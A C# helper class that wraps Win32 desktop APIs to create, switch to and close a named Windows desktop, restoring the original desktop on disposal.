using System;
using System.Runtime.InteropServices;

namespace Pulsar.Client.Helper
{
    /// <summary>
    /// Provides functionality to create and manage a virtual desktop.
    /// </summary>
    public class VirtualDesktopManager : IDisposable
    {
        #region Win32 API Imports

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SwitchDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        [DllImport("user32.dll")]
        private static extern IntPtr GetThreadDesktop(uint dwThreadId);

        #endregion

        #region Fields

        private IntPtr originalDesktop = IntPtr.Zero;

        /// <summary>
        /// Gets the handle to the created desktop.
        /// </summary>
        public IntPtr DesktopHandle { get; private set; } = IntPtr.Zero;

        #endregion

        #region Public Methods

        /// <summary>
        /// Creates or opens a virtual desktop with the specified name.
        /// </summary>
        /// <param name="desktopName">The name of the desktop.</param>
        public void Create(string desktopName)
        {
            if (this.DesktopHandle != IntPtr.Zero)
                throw new InvalidOperationException("Desktop already created.");

            this.originalDesktop = GetThreadDesktop(GetCurrentThreadId());
            IntPtr handle = OpenDesktop(desktopName, 0, false, (uint)DESKTOP_ACCESS.GENERIC_ALL);
            if (handle == IntPtr.Zero)
            {
                handle = CreateDesktop(desktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            }

            if (handle == IntPtr.Zero)
            {
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
            }

            this.DesktopHandle = handle;
        }

        /// <summary>
        /// Switches the current thread and display to the created desktop.
        /// </summary>
        /// <returns>True if the desktop was shown successfully.</returns>
        public bool Show()
        {
            if (this.DesktopHandle == IntPtr.Zero)
                throw new InvalidOperationException("Desktop not created.");

            return SetThreadDesktop(this.DesktopHandle) && SwitchDesktop(this.DesktopHandle);
        }

        /// <summary>
        /// Closes the desktop and switches back to the original one.
        /// </summary>
        public void Close()
        {
            if (this.DesktopHandle != IntPtr.Zero)
            {
                SetThreadDesktop(this.originalDesktop);
                SwitchDesktop(this.originalDesktop);
                CloseDesktop(this.DesktopHandle);
                this.DesktopHandle = IntPtr.Zero;
                this.originalDesktop = IntPtr.Zero;
            }
        }

        #endregion

        #region IDisposable Support

        public void Dispose()
        {
            Close();
            GC.SuppressFinalize(this);
        }

        #endregion

        #region Desktop Access Enum

        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE = 0,
            DESKTOP_READOBJECTS = 0x0001,
            DESKTOP_CREATEWINDOW = 0x0002,
            DESKTOP_CREATEMENU = 0x0004,
            DESKTOP_HOOKCONTROL = 0x0008,
            DESKTOP_JOURNALRECORD = 0x0010,
            DESKTOP_JOURNALPLAYBACK = 0x0020,
            DESKTOP_ENUMERATE = 0x0040,
            DESKTOP_WRITEOBJECTS = 0x0080,
            DESKTOP_SWITCHDESKTOP = 0x0100,
            GENERIC_ALL = DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                          DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                          DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP,
        }

        #endregion
    }
}
